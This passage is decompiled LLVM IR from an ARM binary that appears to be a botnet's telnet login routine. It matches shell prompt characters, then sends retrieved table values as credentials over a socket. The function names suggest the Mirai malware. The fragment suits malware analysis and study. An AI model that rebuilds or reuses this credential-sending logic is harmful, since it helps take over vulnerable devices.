dec_label_pc_e914:                                ; preds = %dec_label_pc_e914.preheader, %dec_label_pc_e908
  %v0_e90c = phi i32 [ %v2_e8ec, %dec_label_pc_e914.preheader ], [ %v1_e90c, %dec_label_pc_e908 ]
  %v0_e914 = phi i32 [ %v1_e8b4, %dec_label_pc_e914.preheader ], [ %v1_e914, %dec_label_pc_e908 ]
  %v1_e914 = add i32 %v0_e914, -1
  store i32 %v1_e914, i32* %r1.global-to-local, align 4
  %v2_e914 = icmp ne i32 %v0_e914, 0
  store i1 %v2_e914, i1* %cpsr_c.global-to-local, align 1
  %v7_e914 = icmp eq i32 %v0_e914, 1
  store i1 %v7_e914, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e914, label %dec_label_pc_e618.backedge.thread528, label %dec_label_pc_e91c

dec_label_pc_e91c:                                ; preds = %dec_label_pc_e914
  %v1_e91c = add i32 %v0_e90c, -2
  %v2_e91c = inttoptr i32 %v1_e91c to i8*
  %v3_e91c = load i8, i8* %v2_e91c, align 1
  %v4_e91c = zext i8 %v3_e91c to i32
  store i32 %v4_e91c, i32* %r2.global-to-local, align 4
  %v2_e920 = icmp ugt i8 %v3_e91c, 61
  store i1 %v2_e920, i1* %cpsr_c.global-to-local, align 1
  %v7_e920 = icmp eq i8 %v3_e91c, 62
  store i1 %v7_e920, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e920, label %dec_label_pc_e92c, label %bb398

bb398:                                            ; preds = %dec_label_pc_e91c
  %v3_e924 = icmp ugt i8 %v3_e91c, 57
  store i1 %v3_e924, i1* %cpsr_c.global-to-local, align 1
  %v8_e924 = icmp eq i8 %v3_e91c, 58
  store i1 %v8_e924, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e924, label %dec_label_pc_e92c, label %dec_label_pc_e8f8

dec_label_pc_e92c:                                ; preds = %dec_label_pc_e91c, %bb398, %dec_label_pc_e908, %dec_label_pc_e900, %dec_label_pc_e8f8, %dec_label_pc_e8e4, %dec_label_pc_e8c0, %dec_label_pc_e8dc, %dec_label_pc_e8d4, %bb397
  %v0_e930 = phi i32 [ %v1_e8b4, %dec_label_pc_e8e4 ], [ %v1_e8b4, %dec_label_pc_e8c0 ], [ %v1_e8b4, %dec_label_pc_e8dc ], [ %v1_e8b4, %dec_label_pc_e8d4 ], [ %v1_e8b4, %bb397 ], [ %v1_e914, %dec_label_pc_e8f8 ], [ %v1_e914, %dec_label_pc_e900 ], [ %v1_e914, %dec_label_pc_e908 ], [ %v1_e914, %bb398 ], [ %v1_e914, %dec_label_pc_e91c ]
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_e930 = add i32 %v0_e930, 1
  store i32 %v1_e930, i32* @r7, align 4
  %v1_e934 = call i32 @table_unlock_val(i32 4)
  store i32 %v2_ec90, i32* %r1.global-to-local, align 4
  store i32 4, i32* %r0.global-to-local, align 4
  %v3_e944 = call i32 @table_retrieve_val(i32 4, i32* nonnull %stack_var_-60)
  store i32 %v3_e944, i32* %r0.global-to-local, align 4
  %v3_e948 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_e948, i32* %r2.global-to-local, align 4
  store i32 %v3_e944, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e954 = load i32, i32* @r5, align 4
  %v1_e954 = add i32 %v0_e954, 4
  %v2_e954 = inttoptr i32 %v1_e954 to i32*
  %v3_e954 = load i32, i32* %v2_e954, align 4
  store i32 %v3_e954, i32* %r0.global-to-local, align 4
  %v4_e958 = call i32 @__libc_send(i32 %v3_e954, i32 %v3_e944, i32 %v3_e948, i32 16384)
  store i32 %v4_e958, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_186cc.498 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_e968 = load i32, i32* @r5, align 4
  %v1_e968 = add i32 %v0_e968, 4
  %v2_e968 = inttoptr i32 %v1_e968 to i32*
  %v3_e968 = load i32, i32* %v2_e968, align 4
  store i32 %v3_e968, i32* %r0.global-to-local, align 4
  %v4_e96c = call i32 @__libc_send(i32 %v3_e968, i32 ptrtoint ([3 x i8]* @global_var_186cc.498 to i32), i32 2, i32 16384)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_e974 = call i32 @table_lock_val(i32 4)
  store i32 8, i32* %r0.global-to-local, align 4
  %v1_e97c = load i32, i32* @r5, align 4
  %v2_e97c = add i32 %v1_e97c, 12
  %v3_e97c = inttoptr i32 %v2_e97c to i32*
  store i32 8, i32* %v3_e97c, align 4
  br label %dec_label_pc_e7b4

dec_label_pc_e984:                                ; preds = %dec_label_pc_e694
  %v1_e984 = add i32 %v0_e694, 24
  %v2_e984 = inttoptr i32 %v1_e984 to i32*
  %v3_e984 = load i32, i32* %v2_e984, align 4
  store i32 %v3_e984, i32* %r2.global-to-local, align 4
  %v1_e988 = add i32 %v3_e984, -1
  store i32 %v1_e988, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_e98c = icmp eq i32 %v1_e988, 0
  store i1 %v2_e98c, i1* %cpsr_z.global-to-local, align 1
  %tmp399 = icmp slt i32 %v1_e988, 1
  br i1 %tmp399, label %dec_label_pc_e618.backedge.thread, label %dec_label_pc_e994

dec_label_pc_e994:                                ; preds = %dec_label_pc_e984
  %v2_e994 = add i32 %v1_e988, %v0_e694
  store i32 %v2_e994, i32* %r3.global-to-local, align 4
  %v1_e998 = add i32 %v2_e994, 28
  %v2_e998 = inttoptr i32 %v1_e998 to i8*
  %v3_e998 = load i8, i8* %v2_e998, align 1
  %v4_e998 = zext i8 %v3_e998 to i32
  store i32 %v4_e998, i32* %r3.global-to-local, align 4
  %v2_e99c = icmp ugt i8 %v3_e998, 61
  store i1 %v2_e99c, i1* %cpsr_c.global-to-local, align 1
  %v7_e99c = icmp eq i8 %v3_e998, 62
  store i1 %v7_e99c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e99c, label %dec_label_pc_ea00, label %bb400

bb400:                                            ; preds = %dec_label_pc_e994
  %v3_e9a0 = icmp ugt i8 %v3_e998, 57
  store i1 %v3_e9a0, i1* %cpsr_c.global-to-local, align 1
  %v8_e9a0 = icmp eq i8 %v3_e998, 58
  store i1 %v8_e9a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9a0, label %dec_label_pc_ea00, label %dec_label_pc_e9a8

dec_label_pc_e9a8:                                ; preds = %bb400
  %v2_e9a8 = icmp ugt i8 %v3_e998, 35
  store i1 %v2_e9a8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9a8 = icmp eq i8 %v3_e998, 36
  store i1 %v7_e9a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9a8, label %dec_label_pc_ea00, label %dec_label_pc_e9b0

dec_label_pc_e9b0:                                ; preds = %dec_label_pc_e9a8
  %v2_e9b0 = icmp ugt i8 %v3_e998, 34
  store i1 %v2_e9b0, i1* %cpsr_c.global-to-local, align 1
  %v7_e9b0 = icmp eq i8 %v3_e998, 35
  store i1 %v7_e9b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9b0, label %dec_label_pc_ea00, label %dec_label_pc_e9b8

dec_label_pc_e9b8:                                ; preds = %dec_label_pc_e9b0
  %v2_e9b8 = icmp ugt i8 %v3_e998, 36
  store i1 %v2_e9b8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9b8 = icmp eq i8 %v3_e998, 37
  store i1 %v7_e9b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9b8, label %dec_label_pc_ea00, label %dec_label_pc_e9e8.preheader

dec_label_pc_e9e8.preheader:                      ; preds = %dec_label_pc_e9b8
  %v3_e9bc = add i32 %v0_e694, 28
  %v2_e9c0 = add i32 %v3_e9bc, %v3_e984
  store i32 %v2_e9c0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_e9e8

dec_label_pc_e9cc:                                ; preds = %bb401
  %v2_e9cc = icmp ugt i8 %v3_e9f0, 35
  store i1 %v2_e9cc, i1* %cpsr_c.global-to-local, align 1
  %v7_e9cc = icmp eq i8 %v3_e9f0, 36
  store i1 %v7_e9cc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9cc, label %dec_label_pc_ea00, label %dec_label_pc_e9d4

dec_label_pc_e9d4:                                ; preds = %dec_label_pc_e9cc
  %v2_e9d4 = icmp ugt i8 %v3_e9f0, 34
  store i1 %v2_e9d4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9d4 = icmp eq i8 %v3_e9f0, 35
  store i1 %v7_e9d4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9d4, label %dec_label_pc_ea00, label %dec_label_pc_e9dc

dec_label_pc_e9dc:                                ; preds = %dec_label_pc_e9d4
  %v2_e9dc = icmp ugt i8 %v3_e9f0, 36
  store i1 %v2_e9dc, i1* %cpsr_c.global-to-local, align 1
  %v7_e9dc = icmp eq i8 %v3_e9f0, 37
  store i1 %v7_e9dc, i1* %cpsr_z.global-to-local, align 1
  %v1_e9e0 = add i32 %v0_e9e0, -1
  store i32 %v1_e9e0, i32* %r3.global-to-local, align 4
  br i1 %v7_e9dc, label %dec_label_pc_ea00, label %dec_label_pc_e9e8

dec_label_pc_e9e8:                                ; preds = %dec_label_pc_e9e8.preheader, %dec_label_pc_e9dc
  %v0_e9e0 = phi i32 [ %v2_e9c0, %dec_label_pc_e9e8.preheader ], [ %v1_e9e0, %dec_label_pc_e9dc ]
  %v0_e9e8 = phi i32 [ %v1_e988, %dec_label_pc_e9e8.preheader ], [ %v1_e9e8, %dec_label_pc_e9dc ]
  %v1_e9e8 = add i32 %v0_e9e8, -1
  store i32 %v1_e9e8, i32* %r1.global-to-local, align 4
  %v2_e9e8 = icmp ne i32 %v0_e9e8, 0
  store i1 %v2_e9e8, i1* %cpsr_c.global-to-local, align 1
  %v7_e9e8 = icmp eq i32 %v0_e9e8, 1
  store i1 %v7_e9e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9e8, label %dec_label_pc_e618.backedge.thread528, label %dec_label_pc_e9f0

dec_label_pc_e9f0:                                ; preds = %dec_label_pc_e9e8
  %v1_e9f0 = add i32 %v0_e9e0, -2
  %v2_e9f0 = inttoptr i32 %v1_e9f0 to i8*
  %v3_e9f0 = load i8, i8* %v2_e9f0, align 1
  %v4_e9f0 = zext i8 %v3_e9f0 to i32
  store i32 %v4_e9f0, i32* %r2.global-to-local, align 4
  %v2_e9f4 = icmp ugt i8 %v3_e9f0, 61
  store i1 %v2_e9f4, i1* %cpsr_c.global-to-local, align 1
  %v7_e9f4 = icmp eq i8 %v3_e9f0, 62
  store i1 %v7_e9f4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_e9f4, label %dec_label_pc_ea00, label %bb401

bb401:                                            ; preds = %dec_label_pc_e9f0
  %v3_e9f8 = icmp ugt i8 %v3_e9f0, 57
  store i1 %v3_e9f8, i1* %cpsr_c.global-to-local, align 1
  %v8_e9f8 = icmp eq i8 %v3_e9f0, 58
  store i1 %v8_e9f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_e9f8, label %dec_label_pc_ea00, label %dec_label_pc_e9cc

dec_label_pc_ea00:                                ; preds = %dec_label_pc_e9f0, %bb401, %dec_label_pc_e9dc, %dec_label_pc_e9d4, %dec_label_pc_e9cc, %dec_label_pc_e9b8, %dec_label_pc_e994, %dec_label_pc_e9b0, %dec_label_pc_e9a8, %bb400
  %v0_ea04 = phi i32 [ %v1_e988, %dec_label_pc_e9b8 ], [ %v1_e988, %dec_label_pc_e994 ], [ %v1_e988, %dec_label_pc_e9b0 ], [ %v1_e988, %dec_label_pc_e9a8 ], [ %v1_e988, %bb400 ], [ %v1_e9e8, %dec_label_pc_e9cc ], [ %v1_e9e8, %dec_label_pc_e9d4 ], [ %v1_e9e8, %dec_label_pc_e9dc ], [ %v1_e9e8, %bb401 ], [ %v1_e9e8, %dec_label_pc_e9f0 ]
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_ea04 = add i32 %v0_ea04, 1
  store i32 %v1_ea04, i32* @r7, align 4
  %v1_ea08 = call i32 @table_unlock_val(i32 6)
  store i32 %v2_ec90, i32* %r1.global-to-local, align 4
  store i32 6, i32* %r0.global-to-local, align 4
  %v3_ea18 = call i32 @table_retrieve_val(i32 6, i32* nonnull %stack_var_-60)
  store i32 %v3_ea18, i32* %r0.global-to-local, align 4
  %v3_ea1c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_ea1c, i32* %r2.global-to-local, align 4
  store i32 %v3_ea18, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ea28 = load i32, i32* @r5, align 4
  %v1_ea28 = add i32 %v0_ea28, 4
  %v2_ea28 = inttoptr i32 %v1_ea28 to i32*
  %v3_ea28 = load i32, i32* %v2_ea28, align 4
  store i32 %v3_ea28, i32* %r0.global-to-local, align 4
  %v4_ea2c = call i32 @__libc_send(i32 %v3_ea28, i32 %v3_ea18, i32 %v3_ea1c, i32 16384)
  store i32 %v4_ea2c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_186cc.498 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_ea3c = load i32, i32* @r5, align 4
  %v1_ea3c = add i32 %v0_ea3c, 4
  %v2_ea3c = inttoptr i32 %v1_ea3c to i32*
  %v3_ea3c = load i32, i32* %v2_ea3c, align 4
  store i32 %v3_ea3c, i32* %r0.global-to-local, align 4
  %v4_ea40 = call i32 @__libc_send(i32 %v3_ea3c, i32 ptrtoint ([3 x i8]* @global_var_186cc.498 to i32), i32 2, i32 16384)
  store i32 6, i32* %r0.global-to-local, align 4
  %v1_ea48 = call i32 @table_lock_val(i32 6)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_ea50 = load i32, i32* @r5, align 4
  %v2_ea50 = add i32 %v1_ea50, 12
  %v3_ea50 = inttoptr i32 %v2_ea50 to i32*
  store i32 7, i32* %v3_ea50, align 4
  br label %dec_label_pc_e7b4

dec_label_pc_ea58:                                ; preds = %dec_label_pc_e694
  %v1_ea58 = add i32 %v0_e694, 24
  %v2_ea58 = inttoptr i32 %v1_ea58 to i32*
  %v3_ea58 = load i32, i32* %v2_ea58, align 4
  store i32 %v3_ea58, i32* %r2.global-to-local, align 4
  %v1_ea5c = add i32 %v3_ea58, -1
  store i32 %v1_ea5c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ea60 = icmp eq i32 %v1_ea5c, 0
  store i1 %v2_ea60, i1* %cpsr_z.global-to-local, align 1
  %tmp402 = icmp slt i32 %v1_ea5c, 1
  br i1 %tmp402, label %dec_label_pc_e618.backedge.thread, label %dec_label_pc_ea68

dec_label_pc_ea68:                                ; preds = %dec_label_pc_ea58
  %v2_ea68 = add i32 %v1_ea5c, %v0_e694
  store i32 %v2_ea68, i32* %r3.global-to-local, align 4
  %v1_ea6c = add i32 %v2_ea68, 28
  %v2_ea6c = inttoptr i32 %v1_ea6c to i8*
  %v3_ea6c = load i8, i8* %v2_ea6c, align 1
  %v4_ea6c = zext i8 %v3_ea6c to i32
  store i32 %v4_ea6c, i32* %r3.global-to-local, align 4
  %v2_ea70 = icmp ugt i8 %v3_ea6c, 61
  store i1 %v2_ea70, i1* %cpsr_c.global-to-local, align 1
  %v7_ea70 = icmp eq i8 %v3_ea6c, 62
  store i1 %v7_ea70, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea70, label %dec_label_pc_ead4, label %bb403

bb403:                                            ; preds = %dec_label_pc_ea68
  %v3_ea74 = icmp ugt i8 %v3_ea6c, 57
  store i1 %v3_ea74, i1* %cpsr_c.global-to-local, align 1
  %v8_ea74 = icmp eq i8 %v3_ea6c, 58
  store i1 %v8_ea74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_ea74, label %dec_label_pc_ead4, label %dec_label_pc_ea7c

dec_label_pc_ea7c:                                ; preds = %bb403
  %v2_ea7c = icmp ugt i8 %v3_ea6c, 35
  store i1 %v2_ea7c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea7c = icmp eq i8 %v3_ea6c, 36
  store i1 %v7_ea7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea7c, label %dec_label_pc_ead4, label %dec_label_pc_ea84

dec_label_pc_ea84:                                ; preds = %dec_label_pc_ea7c
  %v2_ea84 = icmp ugt i8 %v3_ea6c, 34
  store i1 %v2_ea84, i1* %cpsr_c.global-to-local, align 1
  %v7_ea84 = icmp eq i8 %v3_ea6c, 35
  store i1 %v7_ea84, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea84, label %dec_label_pc_ead4, label %dec_label_pc_ea8c

dec_label_pc_ea8c:                                ; preds = %dec_label_pc_ea84
  %v2_ea8c = icmp ugt i8 %v3_ea6c, 36
  store i1 %v2_ea8c, i1* %cpsr_c.global-to-local, align 1
  %v7_ea8c = icmp eq i8 %v3_ea6c, 37
  store i1 %v7_ea8c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_ea8c, label %dec_label_pc_ead4, label %dec_label_pc_eabc.preheader

dec_label_pc_eabc.preheader:                      ; preds = %dec_label_pc_ea8c
  %v3_ea90 = add i32 %v0_e694, 28
  %v2_ea94 = add i32 %v3_ea90, %v3_ea58
  store i32 %v2_ea94, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_eabc

dec_label_pc_eaa0:                                ; preds = %bb404
  %v2_eaa0 = icmp ugt i8 %v3_eac4, 35
  store i1 %v2_eaa0, i1* %cpsr_c.global-to-local, align 1
  %v7_eaa0 = icmp eq i8 %v3_eac4, 36
  store i1 %v7_eaa0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eaa0, label %dec_label_pc_ead4, label %dec_label_pc_eaa8

dec_label_pc_eaa8:                                ; preds = %dec_label_pc_eaa0
  %v2_eaa8 = icmp ugt i8 %v3_eac4, 34
  store i1 %v2_eaa8, i1* %cpsr_c.global-to-local, align 1
  %v7_eaa8 = icmp eq i8 %v3_eac4, 35
  store i1 %v7_eaa8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eaa8, label %dec_label_pc_ead4, label %dec_label_pc_eab0

dec_label_pc_eab0:                                ; preds = %dec_label_pc_eaa8
  %v2_eab0 = icmp ugt i8 %v3_eac4, 36
  store i1 %v2_eab0, i1* %cpsr_c.global-to-local, align 1
  %v7_eab0 = icmp eq i8 %v3_eac4, 37
  store i1 %v7_eab0, i1* %cpsr_z.global-to-local, align 1
  %v1_eab4 = add i32 %v0_eab4, -1
  store i32 %v1_eab4, i32* %r3.global-to-local, align 4
  br i1 %v7_eab0, label %dec_label_pc_ead4, label %dec_label_pc_eabc

dec_label_pc_eabc:                                ; preds = %dec_label_pc_eabc.preheader, %dec_label_pc_eab0
  %v0_eab4 = phi i32 [ %v2_ea94, %dec_label_pc_eabc.preheader ], [ %v1_eab4, %dec_label_pc_eab0 ]
  %v0_eabc = phi i32 [ %v1_ea5c, %dec_label_pc_eabc.preheader ], [ %v1_eabc, %dec_label_pc_eab0 ]
  %v1_eabc = add i32 %v0_eabc, -1
  store i32 %v1_eabc, i32* %r1.global-to-local, align 4
  %v2_eabc = icmp ne i32 %v0_eabc, 0
  store i1 %v2_eabc, i1* %cpsr_c.global-to-local, align 1
  %v7_eabc = icmp eq i32 %v0_eabc, 1
  store i1 %v7_eabc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eabc, label %dec_label_pc_e618.backedge.thread528, label %dec_label_pc_eac4

dec_label_pc_eac4:                                ; preds = %dec_label_pc_eabc
  %v1_eac4 = add i32 %v0_eab4, -2
  %v2_eac4 = inttoptr i32 %v1_eac4 to i8*
  %v3_eac4 = load i8, i8* %v2_eac4, align 1
  %v4_eac4 = zext i8 %v3_eac4 to i32
  store i32 %v4_eac4, i32* %r2.global-to-local, align 4
  %v2_eac8 = icmp ugt i8 %v3_eac4, 61
  store i1 %v2_eac8, i1* %cpsr_c.global-to-local, align 1
  %v7_eac8 = icmp eq i8 %v3_eac4, 62
  store i1 %v7_eac8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eac8, label %dec_label_pc_ead4, label %bb404

bb404:                                            ; preds = %dec_label_pc_eac4
  %v3_eacc = icmp ugt i8 %v3_eac4, 57
  store i1 %v3_eacc, i1* %cpsr_c.global-to-local, align 1
  %v8_eacc = icmp eq i8 %v3_eac4, 58
  store i1 %v8_eacc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_eacc, label %dec_label_pc_ead4, label %dec_label_pc_eaa0

dec_label_pc_ead4:                                ; preds = %dec_label_pc_eac4, %bb404, %dec_label_pc_eab0, %dec_label_pc_eaa8, %dec_label_pc_eaa0, %dec_label_pc_ea8c, %dec_label_pc_ea68, %dec_label_pc_ea84, %dec_label_pc_ea7c, %bb403
  %v0_ead8 = phi i32 [ %v1_ea5c, %dec_label_pc_ea8c ], [ %v1_ea5c, %dec_label_pc_ea68 ], [ %v1_ea5c, %dec_label_pc_ea84 ], [ %v1_ea5c, %dec_label_pc_ea7c ], [ %v1_ea5c, %bb403 ], [ %v1_eabc, %dec_label_pc_eaa0 ], [ %v1_eabc, %dec_label_pc_eaa8 ], [ %v1_eabc, %dec_label_pc_eab0 ], [ %v1_eabc, %bb404 ], [ %v1_eabc, %dec_label_pc_eac4 ]
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_ead8 = add i32 %v0_ead8, 1
  store i32 %v1_ead8, i32* @r7, align 4
  %v1_eadc = call i32 @table_unlock_val(i32 7)
  store i32 %v2_ec90, i32* %r1.global-to-local, align 4
  store i32 7, i32* %r0.global-to-local, align 4
  %v3_eaec = call i32 @table_retrieve_val(i32 7, i32* nonnull %stack_var_-60)
  store i32 %v3_eaec, i32* %r0.global-to-local, align 4
  %v3_eaf0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_eaf0, i32* %r2.global-to-local, align 4
  store i32 %v3_eaec, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_eafc = load i32, i32* @r5, align 4
  %v1_eafc = add i32 %v0_eafc, 4
  %v2_eafc = inttoptr i32 %v1_eafc to i32*
  %v3_eafc = load i32, i32* %v2_eafc, align 4
  store i32 %v3_eafc, i32* %r0.global-to-local, align 4
  %v4_eb00 = call i32 @__libc_send(i32 %v3_eafc, i32 %v3_eaec, i32 %v3_eaf0, i32 16384)
  store i32 %v4_eb00, i32* %r0.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_186cc.498 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_eb10 = load i32, i32* @r5, align 4
  %v1_eb10 = add i32 %v0_eb10, 4
  %v2_eb10 = inttoptr i32 %v1_eb10 to i32*
  %v3_eb10 = load i32, i32* %v2_eb10, align 4
  store i32 %v3_eb10, i32* %r0.global-to-local, align 4
  %v4_eb14 = call i32 @__libc_send(i32 %v3_eb10, i32 ptrtoint ([3 x i8]* @global_var_186cc.498 to i32), i32 2, i32 16384)
  store i32 7, i32* %r0.global-to-local, align 4
  %v1_eb1c = call i32 @table_lock_val(i32 7)
  store i32 9, i32* %r0.global-to-local, align 4
  %v1_eb24 = load i32, i32* @r5, align 4
  %v2_eb24 = add i32 %v1_eb24, 12
  %v3_eb24 = inttoptr i32 %v2_eb24 to i32*
  store i32 9, i32* %v3_eb24, align 4
  br label %dec_label_pc_e7b4

dec_label_pc_eb2c:                                ; preds = %dec_label_pc_e694
  %v1_eb2c = add i32 %v0_e694, 24
  %v2_eb2c = inttoptr i32 %v1_eb2c to i32*
  %v3_eb2c = load i32, i32* %v2_eb2c, align 4
  store i32 %v3_eb2c, i32* %r2.global-to-local, align 4
  %v1_eb30 = add i32 %v3_eb2c, -1
  store i32 %v1_eb30, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_eb34 = icmp eq i32 %v1_eb30, 0
  store i1 %v2_eb34, i1* %cpsr_z.global-to-local, align 1
  %tmp405 = icmp slt i32 %v1_eb30, 1
  br i1 %tmp405, label %dec_label_pc_e618.backedge.thread, label %dec_label_pc_eb3c

dec_label_pc_eb3c:                                ; preds = %dec_label_pc_eb2c
  %v2_eb3c = add i32 %v1_eb30, %v0_e694
  store i32 %v2_eb3c, i32* %r3.global-to-local, align 4
  %v1_eb40 = add i32 %v2_eb3c, 28
  %v2_eb40 = inttoptr i32 %v1_eb40 to i8*
  %v3_eb40 = load i8, i8* %v2_eb40, align 1
  %v4_eb40 = zext i8 %v3_eb40 to i32
  store i32 %v4_eb40, i32* %r3.global-to-local, align 4
  %v2_eb44 = icmp ugt i8 %v3_eb40, 61
  store i1 %v2_eb44, i1* %cpsr_c.global-to-local, align 1
  %v7_eb44 = icmp eq i8 %v3_eb40, 62
  store i1 %v7_eb44, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb44, label %dec_label_pc_eba8, label %bb406

bb406:                                            ; preds = %dec_label_pc_eb3c
  %v3_eb48 = icmp ugt i8 %v3_eb40, 57
  store i1 %v3_eb48, i1* %cpsr_c.global-to-local, align 1
  %v8_eb48 = icmp eq i8 %v3_eb40, 58
  store i1 %v8_eb48, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_eb48, label %dec_label_pc_eba8, label %dec_label_pc_eb50

dec_label_pc_eb50:                                ; preds = %bb406
  %v2_eb50 = icmp ugt i8 %v3_eb40, 35
  store i1 %v2_eb50, i1* %cpsr_c.global-to-local, align 1
  %v7_eb50 = icmp eq i8 %v3_eb40, 36
  store i1 %v7_eb50, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb50, label %dec_label_pc_eba8, label %dec_label_pc_eb58

dec_label_pc_eb58:                                ; preds = %dec_label_pc_eb50
  %v2_eb58 = icmp ugt i8 %v3_eb40, 34
  store i1 %v2_eb58, i1* %cpsr_c.global-to-local, align 1
  %v7_eb58 = icmp eq i8 %v3_eb40, 35
  store i1 %v7_eb58, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb58, label %dec_label_pc_eba8, label %dec_label_pc_eb60

dec_label_pc_eb60:                                ; preds = %dec_label_pc_eb58
  %v2_eb60 = icmp ugt i8 %v3_eb40, 36
  store i1 %v2_eb60, i1* %cpsr_c.global-to-local, align 1
  %v7_eb60 = icmp eq i8 %v3_eb40, 37
  store i1 %v7_eb60, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb60, label %dec_label_pc_eba8, label %dec_label_pc_eb90.preheader

dec_label_pc_eb90.preheader:                      ; preds = %dec_label_pc_eb60
  %v3_eb64 = add i32 %v0_e694, 28
  %v2_eb68 = add i32 %v3_eb64, %v3_eb2c
  store i32 %v2_eb68, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_eb90

dec_label_pc_eb74:                                ; preds = %bb407
  %v2_eb74 = icmp ugt i8 %v3_eb98, 35
  store i1 %v2_eb74, i1* %cpsr_c.global-to-local, align 1
  %v7_eb74 = icmp eq i8 %v3_eb98, 36
  store i1 %v7_eb74, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb74, label %dec_label_pc_eba8, label %dec_label_pc_eb7c

dec_label_pc_eb7c:                                ; preds = %dec_label_pc_eb74
  %v2_eb7c = icmp ugt i8 %v3_eb98, 34
  store i1 %v2_eb7c, i1* %cpsr_c.global-to-local, align 1
  %v7_eb7c = icmp eq i8 %v3_eb98, 35
  store i1 %v7_eb7c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb7c, label %dec_label_pc_eba8, label %dec_label_pc_eb84

dec_label_pc_eb84:                                ; preds = %dec_label_pc_eb7c
  %v2_eb84 = icmp ugt i8 %v3_eb98, 36
  store i1 %v2_eb84, i1* %cpsr_c.global-to-local, align 1
  %v7_eb84 = icmp eq i8 %v3_eb98, 37
  store i1 %v7_eb84, i1* %cpsr_z.global-to-local, align 1
  %v1_eb88 = add i32 %v0_eb88, -1
  store i32 %v1_eb88, i32* %r3.global-to-local, align 4
  br i1 %v7_eb84, label %dec_label_pc_eba8, label %dec_label_pc_eb90

dec_label_pc_eb90:                                ; preds = %dec_label_pc_eb90.preheader, %dec_label_pc_eb84
  %v0_eb88 = phi i32 [ %v2_eb68, %dec_label_pc_eb90.preheader ], [ %v1_eb88, %dec_label_pc_eb84 ]
  %v0_eb90 = phi i32 [ %v1_eb30, %dec_label_pc_eb90.preheader ], [ %v1_eb90, %dec_label_pc_eb84 ]
  %v1_eb90 = add i32 %v0_eb90, -1
  store i32 %v1_eb90, i32* %r1.global-to-local, align 4
  %v2_eb90 = icmp ne i32 %v0_eb90, 0
  store i1 %v2_eb90, i1* %cpsr_c.global-to-local, align 1
  %v7_eb90 = icmp eq i32 %v0_eb90, 1
  store i1 %v7_eb90, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_eb90, label %dec_label_pc_e618.backedge.thread528, label %dec_label_pc_eb98

dec_label_pc_eb98:                                ; preds = %dec_label_pc_eb90
  %v1_eb98 = add i32 %v0_eb88, -2
  %v2_eb98 = inttoptr i32 %v1_eb98 to i8*
  %v3_eb98 = load i8, i8* %v2_eb98, align 1
  %v4_eb98 = zext i8 %v3_eb98 to i32
  store i32 %v4_eb98, i32* %r2.global-to-local, align 4
  %v2_eb9c = icmp ugt i8 %v3_eb98, 61
  store i1 %v2_eb9c, i1* %cpsr_c.global-to-local, align 1
